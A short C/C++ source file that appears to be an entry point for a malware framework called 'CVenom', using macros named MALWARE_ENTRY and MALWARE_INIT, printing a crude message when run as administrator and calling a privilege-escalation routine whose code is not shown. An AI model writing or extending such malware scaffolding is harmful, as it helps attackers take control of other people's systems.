#include "../../CVenom.h"
#include "../../DominationTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	if(Current.privileges == ADMIN)
		printf("Admin Assholes\n");

	DominationTools	Dominator;
	Dominator.EscalatePrivileges();


	cvexit(MALWARE_EXIT);
}
